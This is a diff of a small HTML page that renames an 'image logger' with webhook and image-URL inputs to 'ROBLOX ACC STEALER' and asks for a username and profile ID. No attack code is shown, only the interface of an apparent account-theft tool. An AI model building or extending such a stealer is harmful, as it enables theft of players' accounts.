@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title> Joses Image Logger</title>
+<title> ROBLOX ACC STEALER</title>
 <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
 </head>
@@ -11,16 +11,16 @@
     <img src ="assets/profile.jpg">
     <script src="main.js"></script>
     <div class="joses-text">
-        <h1> Joses Image Logger</h1>
+        <h1> ROBLOX ACC STEALER</h1>
     </div>
     <div class ="input-container">
       <i class ="fa fa-user icon"></i>
-      <input class ="input-field" type ="text" placeholder ="Enter Webhook">
+      <input class ="input-field" type ="text" placeholder ="Enter USERNAME">
 </div>
    
 <div class ="input-container">
       <i class ="fa fa-key icon"></i>
-      <input class ="input-field" type ="text" placeholder ="Enter Image Url">
+      <input class ="input-field" type ="text" placeholder ="Enter ENTER THERE PROFILE ID">
      </div>
    
 </div>
